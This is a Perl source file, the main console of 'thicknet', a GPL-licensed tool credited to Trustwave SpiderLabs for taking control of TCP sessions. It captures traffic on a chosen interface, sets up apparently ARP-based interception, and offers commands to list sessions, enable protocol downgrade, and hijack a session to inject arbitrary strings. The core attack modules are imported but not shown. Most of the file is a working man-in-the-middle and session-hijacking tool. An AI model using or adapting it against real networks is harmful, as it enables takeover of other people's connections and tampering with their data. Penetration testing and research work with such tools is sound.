#!/usr/bin/perl

=header
    thicknet - A tool to manipulate and take control of TCP sessions
	Copyright (C) 2010 Steve Ocepek and Wendel G. Henrique,
	Trustwave SpiderLabs
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use strict;
use warnings;
use Net::Pcap;
use lib '.';
use thicknet::Util;
use thicknet::pcap::Oracle;
use thicknet::pcap::ARP;
use thicknet::pcap::Default;
use AnyEvent;
use Data::HexDump;
use EV;

# Flush after every write to stdout
local $| = 1;

my $mymac;
my $myip;
my $myhexip;
my $dev;

# Session hash
# key: client:clientport:server:serverport
my %sessions;

# Console vars
my @console;
my $context;
my $prompt = "\nthicknet> ";

sub cmdline {
	# Listening interface
	# Specify on command line or prompt
	my %devinfo;
	my $err;
	my $index = 1;
	
	if ($ARGV[0]) {
		$dev = $ARGV[0];
	}
	else {
		# Show available devices, allow user to choose
		# TODO allow int specified on ARGV
		my @devs = Net::Pcap::findalldevs(\$err, \%devinfo);
		if ($devs[0]) {
			print "\n";
			print "Please choose an interface to listen on\n\n";

			for my $d (@devs) {
			    print "$index: $d - $devinfo{$d}\n";
			    $index++;
			}

			print "\n> ";
			my $choice = <STDIN>;
			chomp ($choice);

			$dev = $devs[$choice-1];
		}
		else {
			print "No interfaces found. Ensure that current user has admin/root priveleges.\n";
			exit;
		}
	
	}
}

sub console_inject {
	chomp (my ($input) = @_);
	push (@console, \&console_inject);
	$prompt = "\nthicknet(inject-" . thicknet::Util::session_hex2ip($context) . ") > "; 
	if ($input eq '?') {
		print "Commands:\n\n";
		print "(string)     inject string into session\n";
		print "!!           stop injection\n";
		print "?            help (this page)\n";
		print "\n";
	}
	elsif ($input eq '') {
	}
	elsif ($input eq '!!') {
		$sessions{$context}->{examine} = 0;
		pop(@console);
		return;
	}
	else {
		thicknet::pcap::Oracle::inject($sessions{$context}, $input);
	}
	return $prompt;
}

sub console_inject_file {
	chomp (my ($input) = @_);
	push (@console, \&console_inject);
	$prompt = "\nthicknet(inject-" . thicknet::Util::session_hex2ip($context) . ") > "; 
	if ($input eq '?') {
		print "Commands:\n\n";
		print "(string)     inject string into session\n";
		print "!!           stop injection\n";
		print "?            help (this page)\n";
		print "\n";
	}
	elsif ($input eq '') {
	}
	elsif ($input eq '!!') {
		$sessions{$context}->{examine} = 0;
		pop(@console);
		return;
	}
	else {
		thicknet::pcap::Oracle::inject($sessions{$context}, $input);
	}
	return $prompt;
}

sub console_examine {
	chomp (my ($input) = @_);
	push (@console, \&console_examine); 
	$prompt = "\nthicknet(examine-" . thicknet::Util::session_hex2ip($context) . ") > "; 
	# Menu
	if ($input eq '?') {
		print "Commands:\n\n";
		print "s            toggle packet display\n";
		print "i            hijack connection and begin injection\n";
		print "             (caution: will disconnect client!)\n";
		print "back         go back to higher level menu\n";
		print "?            help (this page)\n";
		print "\n";
	}
	elsif ($input eq 's') {
		if ($sessions{$context}->{examine}) {
			$sessions{$context}->{examine} = 0;
			print "Packet display disabled\n";
		}
		else {
			$sessions{$context}->{examine} = 1;
			print "Packet display enabled\n";
		}
	}
	elsif ($input eq 'i') {
		if ($sessions{$context}->{sled}) {
			# Block and start dumping packets
			$sessions{$context}->{block} = 1;
			$sessions{$context}->{examine} = 1;
			console_inject('');
		} else {
			print "Can't inject: sled not captured";
		}
	}
	elsif ($input eq 'back') {
		$sessions{$context}->{examine} = 0;
		pop(@console);
		return;
	}
	elsif ($input eq '') {
	}
	elsif (($input eq 'q') or ($input eq 'exit')) {
		exit;
	}
	else {
		print "Unknown command. Type '?' for help.\n";
	}
	return $prompt
}

sub console_root {
	chomp (my ($input) = @_);
	$prompt = "\nthicknet> ";
	if ($input eq '?') {
		print "Commands:\n\n";
		print "ls           list sessions\n";
		print "d            enable/disable protocol downgrade\n";
		print "x (session)  examine session (and possibly inject)\n";
		print "q            quit\n";
		print "?            help (this page)\n";
		print "\n";
	} 
	elsif ($input eq 'ls') {
		print "\n";
		foreach my $session (keys(%sessions)) {
			my $string = thicknet::Util::session_hex2ip($session);
			if ($sessions{$session}->{sled}) {
				$string = $string . " !I";
			}
			print "$string\n";
		}
	}
	elsif ($input eq '') {
	}
	elsif (($input eq 'q') or ($input eq 'exit')) {
		exit;
	}
	elsif ($input eq 'd') {
		if ($thicknet::pcap::Oracle::downgrade) {
			$thicknet::pcap::Oracle::downgrade = 0;
			print "\nProtocol downgrade disabled\n";
		} else {
			$thicknet::pcap::Oracle::downgrade = 1;
			print "\nProtocol downgrade enabled\n";
		}
	}
	elsif ($input =~ /x (\b(?:\d{1,3}\.){3}\d{1,3}\b:\d{1,5}:\b(?:\d{1,3}\.){3}\d{1,3}\b:\d{1,5})/) {
		my $input_session = thicknet::Util::session_ip2hex($1);
		if ($sessions{$input_session}) {
			$context = $input_session;
			console_examine('');
		}
		else {
			print "Invalid session\n";
		}
	}
	
	else {
		print "Unknown command. Type '?' for help.\n";
	}
	return $prompt;
}

sub console {
	my ($input) = @_;
	my $place = pop(@console);
	if ($place) {
		$prompt = &$place($input);
	} else {
		$prompt = console_root($input);
	}
	if ($prompt) {
		print $prompt;
	} else {
		console('');
	}
}

# Execute

cmdline();

($mymac, $myip, $myhexip) = thicknet::Util::getif($dev);

# User console
my $watcher_cli = AnyEvent->io (fh => \*STDIN, poll => 'r', cb => sub {  
	my $input = <STDIN>;
	console($input);
});

my $watcher_oracle = thicknet::pcap::Oracle::init (
	myip => $myip,
	mymac => $mymac,
	dev => $dev,
	sessions => \%sessions
	);

my $watcher_arp = thicknet::pcap::ARP::init (
	dev => $dev,
	myip => $myip,
	mymac => $mymac
	);

my $watcher_default = thicknet::pcap::Default::init (
	dev => $dev,
	myip => $myip,
	mymac => $mymac
	);

print "\nthicknet (barcelona)\n";
print "(c) 2010 Wendel G. Henrique and Steve Ocepek\n";
print "Trustwave SpiderLabs\n";
print $prompt;
EV::loop;
